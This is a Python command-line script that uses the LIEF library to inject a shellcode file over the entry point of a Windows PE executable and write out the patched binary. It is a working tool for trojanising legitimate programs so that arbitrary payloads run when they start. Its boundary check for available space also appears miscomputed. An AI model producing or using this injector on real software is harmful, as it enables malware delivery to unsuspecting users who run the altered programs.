import argparse
import lief

def main(f_name_shellcode, f_nameloader, output):
    
    loader = lief.parse(f_nameloader)
    if loader == None:
        print("[-] Failed parsing binary")
        return

    shellcode = open(f_name_shellcode, "rb").read()
    section_entrypoint = None

    print(f"[*] Read {f_name_shellcode} ({str(len(shellcode))} bytes)")
    entrypoint = loader.optional_header.addressof_entrypoint
    print(f"[*] Parsing {f_nameloader}")
    print(f"[*] Entrypoint: {hex(entrypoint)}")
    print(f"[**] Searching entrypoint in sections ... ")
    for section in loader.sections:
        if entrypoint >= section.virtual_address and entrypoint <= section.virtual_address + section.size:
            print(f"[**] Entrypoint in: " + section.name)
            section_entrypoint = section

    if not section_entrypoint:
        print(f"[-] Could not map entrypoint to section :(")
        return

    print(f"[*] Entrypoint: {hex(entrypoint)}")
    if entrypoint + section_entrypoint.virtual_address + len(shellcode) >= section_entrypoint.virtual_address + section_entrypoint.size:
        print(f"[-] Not enough space between entrypoint and section end for shellcode :(")
        return

    loader.patch_address(entrypoint, list(shellcode))
    builder = lief.PE.Builder(loader)
    builder.build()
    builder.write(output)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-shellcode", required=True)
    parser.add_argument("-loader", required=True)
    parser.add_argument("-output", required=True)
    args = parser.parse_args()

    main(args.shellcode, args.loader, args.output)